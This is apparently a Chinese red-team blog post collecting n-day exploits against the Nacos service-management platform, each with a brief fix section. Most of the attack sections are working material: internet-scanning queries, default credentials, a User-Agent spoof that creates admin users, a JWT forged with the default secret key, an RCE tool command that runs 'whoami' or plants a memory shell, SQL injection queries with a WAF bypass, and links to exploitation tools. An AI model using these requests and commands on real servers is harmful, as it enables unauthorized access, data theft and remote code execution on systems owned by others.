---
title: 【Nacos】Nacos Nday漏洞
date: 2025-08-28
categories:
  - Web攻防
  - 红队
image: images/10.webp
---
# 0x00 前置知识
## 1. 平台语法
```
hunter语法：
app.name="Nacos"
fofa语法：
title="nacos"
app="nacos"
```
端口：port="8848"
## 2. 信息收集
**资产少的情况下：**
如果没有明显特征，那就通过被动扫描器，如：burp的插件TsojanScan，HAE，logger++等
```
https://github.com/Tsojan/TsojanScan
```
**资产多的情况下：**
那我们就直接使用指纹识别工具EHole_magic
```
https://comm.pgpsec.cn/54.html
```
可以特定⼀些⽬录如nacos、/webroot/decision/login等等，进⾏更加精确的扫描进⾏精准的识别。（但网站收费）
**批量漏洞检测工具：**
NacosExploit
```
https://github.com/h0ny/NacosExploit
```
漏洞检测：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704212254.png)
## 3. 漏洞利用点
Nacos 默认帐户名密码：
```
nacos/nacos
```
# 0x01 CVE-2021-29441 Nacos 权限认证绕过漏洞
## 1. 漏洞概述
2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括**创建新⽤户**并进⾏登录后操作。
## 2. 影响版本
**Nacos <= 2.0.0-ALPHA.1**
## 3. 环境搭建
**Nacos下载地址(github):**
```
https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1
```
Windows搭建：
1. 进入github下载地址后下载版本：
```
nacos-server-2.0.0-ALPHA.1.zip
```
2. 解压出来后进入bin目录：
```
D:\TargetDrone\nacos-server-2.0.0-ALPHA.1\nacos-server-2.0.0-ALPHA.1\nacos\bin
```
3. 输入在当前文件夹下使用打开cmd窗口，输入命令：
```
.\startup.cmd -m standalone
```
4. 然后访问网站：
```
http://192.168.31.134:8848/nacos/
192.168.31.134：自己的内网IP地址
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214003.png)
 5. 默认账号密码
```
 nacos/nacos
```
即可。
## 4. 漏洞复现
1. 漏洞路径
```
http: your-ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=1
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214308.png)
2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问
```
http: your-ip:8848/nacos/v1/auth/users
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214433.png)
PSOT传参：
```
username=test1&password=test1
```
 UA 头：
```
 Nacos-Server 
```
发送POST请求，返回码200，创建⽤户成功~！
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705124923.png)
返回Nacos登录界面：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125222.png)

使用账号/密码：
```
test1/test1
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125331.png)
关闭环境：
```
./shutdown.sh
```
## 5. 漏洞分析
Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。
正因为这样，所以当我们**UA恶意改为Nacos-Server的时候**，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。
这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析
关键代码在该⽂件下:
```
/nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise
Filter.java
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125530.png)
TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。
就是很简单的⼀个对于UA的⼀个判断逻辑
这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。
## 6. 漏洞修复
若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。
# 0x02 QVD-2023-6271 Nacos身份绕过漏洞
## 1. 漏洞概述
开源服务管理平台 Nacos 中存在身份认证绕过漏洞，在默认配置下未对 token.secret.key进⾏修改，导致远程攻击者可以绕过密钥认证进⼊后台，造成系统受控等后果。
## 2. 影响版本
**0.1.0 <= Nacos <= 2.2.0**
## 3. 环境搭建
### windows搭建
1. ⾸先从GitHub下载带有漏洞的源码：
```
https://github.com/alibaba/nacos/releases
```
2. 打开网址，找到2.2.0-BETA (Oct 28, 2022)版本。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125944.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705130137.png)
3. 下载下来即可。
4. 我这边下载windows版本，直接解压出来，进入到该目录：
```
nacos-server-2.2.0-BETA\nacos-server-2.2.0-BETA\nacos\bin
```
5. cmd运行：
```
.\startup.cmd -m standalone
```
6. 访问地址即可：
```
http://192.168.197.1:8848/nacos/index.html#/login
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705130401.png)
## 4. 漏洞复现
在nacos中，token.secret.key值是固定死的，位置在conf下application.properties中：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705130657.png)
拿到key，这个key可以直接使用：
```
SecretKey012345678901234567890123456789012345678901234567890123456789
```
打开JWT⽹址：
```
https://jwt.io/
```
输入以下三个框，进行生成jwt token：
**Valid header：**
```
{
	"alg": "HS256",
	"typ": "JWT"
}
```
**Payload: Data：**
```
{
	"sub":"nacos",
	"exp":1754463482
}
```
**Sign JWT: Secret：**
```
SecretKey012345678901234567890123456789012345678901234567890123456789
```
并且选中**base64url**。
时间戳生成网站：
```
https://tool.lu/timestamp/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705154205.png)
生成的Token拿下来：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc1NDQ2MzQ4Mn0.UG3frNR5f6JY0Np51Hu1cSB1kzRiMS7u50nur01KAeE
```
构造成：
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc1NDQ2MzQ4Mn0.UG3frNR5f6JY0Np51Hu1cSB1kzRiMS7u50nur01KAeE
```
然后抓取登录的数据包：
```go
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 172.17.16.253:8848
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.16.253:8848
Connection: keep-alive
Referer: http://172.17.16.253:8848/nacos/index.html
Priority: u=0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc1NDQ2MzQ4Mn0.UG3frNR5f6JY0Np51Hu1cSB1kzRiMS7u50nur01KAeE

username=admin&password=admin
```

![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705154105.png)
响应数据包：
```
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Security-Policy: script-src 'self'
Set-Cookie: JSESSIONID=BF703FFD0C4F90F4171EECFA36611CCA; Path=/nacos; HttpOnly
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc1NDQ2MzQ4Mn0.UG3frNR5f6JY0Np51Hu1cSB1kzRiMS7u50nur01KAeE
Content-Type: application/json
Date: Sat, 05 Jul 2025 07:40:16 GMT
Keep-Alive: timeout=60
Connection: keep-alive
Content-Length: 197

{
"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc1NDQ2MzQ4Mn0.UG3frNR5f6JY0Np51Hu1cSB1kzRiMS7u50nur01KAeE",
"tokenTtl":18000,
"globalAdmin":true,
"username":"nacos"
}
```
利用获取到的token登录后台，先登录，再进行burp拦截抓包，并拦截该响应：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705154858.png)
然后替换掉我们之前的相应数据包：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705155059.png)
放行：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705155144.png)
成功登录到系统。
## 5. 修复⽅式
 1. ⽬前官⽅已有可更新版本，建议受影响⽤户升级⾄2.2.0.1或以上版本
```
https://github.com/alibaba/nacos/releases/tag/2.2.0.1
```
2. 删除默认配置中的下列选项，启动nacos时必须⼿动配置nacos.core.auth.server.identity.key nacos.core.auth.server.identity.value nacos.core.auth.plugin.nacos.token.secret.key 
3. 缓解措施： 
	1.   检 查application.properties ⽂ 件 中 token.secret.key 属 性 ， 若 为 默 认 值 ， 可 参 考 ：https://nacos.io/zhcn/docs/v2/guide/user/auth.html进⾏更改。 
	2. 将Nacos部署于内部⽹络环境
# 0x03 CNVD-2023-45001/QVD-2023-13065 Nacos 集群 Raft 反序列化漏洞
## 1. 漏洞概述
Nacos 在处理某些基于 Jraft 的请求时，采⽤ Hessian 进⾏反序列化，但并未设置限制，导致应⽤存在远程代码执⾏（RCE）漏洞。
Nacos 1.x 在单机模式下默认不开放 7848 端⼝，故该情况通常不受此漏洞影响。Nacos 2.x 版本⽆论单机或集群模式均默认开放 7848 端⼝。
所以开放7848端⼝的nacos服务可以当作该洞的⼀个特征。
## 2. 影响版本
1.4.0 <= Nacos < 1.4.6 使⽤cluster集群模式运⾏
2.0.0 <= Nacos < 2.2.3 任意模式启动
## 3. 漏洞复现
提供⼀个现成⼯具：
```
https://github.com/c0olw/NacosRce/
```
工具使用：
自动注入内存马并执行命令 java -jar NacosRce.jar Url Jraft端口 "Command"：
```
java -jar NacosRce.jar http://172.17.16.253:8848/nacos 7848 "whoami"
```
只注入内存马：
```
java -jar NacosRce.jar http://192.168.90.1:8848/nacos 7848 memshell
```
## 4. 漏洞修复
通⽤修补建议升级到Nacos 1.4.6 、Nacos 2.2.3 ：
```
https://github.com/alibaba/nacos/releases/tag/1.4.6
https://github.com/alibaba/nacos/releases/tag/2.2.3
```
# 0x04 CNVD-2020-67618 sql注⼊
## 1. 漏洞概述
Nacos config server 中有未鉴权接⼝，执⾏ SQL 语句可以查看敏感数据，可以执⾏任意的 SELECT 查询语句。
## 2. 影响版本
使用derby数据库进行部署的Nacos
## 3. 漏洞复现
```
/nacos/v1/cs/ops/derby?&sql=SELECT *FROM users
/nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables
/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users
```
绕过：
```
/nacos/v1/cs/ops/derby?sql=SELECT-
-/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssa
ddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssadd
ssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssadds
saddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddss
addssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssa
ddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad
dssaddssaddssaddssaddssaddssaddssaddssad&sql=/%0a*-
-/%25&q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddss
addssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssa
ddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad
dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssadd
ssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssadds
saddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddss
addssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssa
ddssaddssaddssaddssaddssaddssaddssaddssaddssad%&sql=%0afrom-
-/&sql=/%0ausers
```
其他sql语句，利⽤这些语句可以直接查询整个数据库：
```
select * from users
select * from permissions
select * from roles
select * from tenant_info
select * from tenant_capacity
select * from group_capacity
select * from config_tags_relation
select * from app_configdata_relation_pubs
select * from app_configdata_relation_subs
select * from app_list
select * from config_info_aggr
select * from config_info_tag
select * from config_info_beta
select * from his_config_info
select * from config_info
```
# 0x05 工具
反序列化漏洞利⽤⼯具
```
https://github.com/c0olw/NacosRce/releases/tag/v0.5
```
哥斯拉nacos后渗透插件
```
https://github.com/pap1rman/postnacos
```
**综合利⽤,且gui版本**
```
https://github.com/charonlight/NacosExploitGUI
```